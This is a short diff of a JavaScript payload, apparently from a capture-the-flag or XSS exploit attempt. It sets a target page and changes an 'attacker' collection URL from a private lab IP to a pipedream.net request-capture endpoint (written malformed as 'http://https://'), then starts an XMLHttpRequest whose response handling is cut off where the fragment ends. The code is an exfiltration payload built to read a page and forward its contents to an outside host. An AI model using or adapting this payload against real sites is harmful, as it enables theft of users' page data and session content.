@@ -1,5 +1,5 @@
-var url = "https://chess.com/";
-var attacker = "http://10.10.14.8/?q=";
+var url = "https://chess.com";
+var attacker = "http://https://eo17vdm4n5qoswh.m.pipedream.net/?q=";
 var xhr  = new XMLHttpRequest();
 xhr.onreadystatechange = function() {
     if (xhr.readyState == XMLHttpRequest.DONE) {
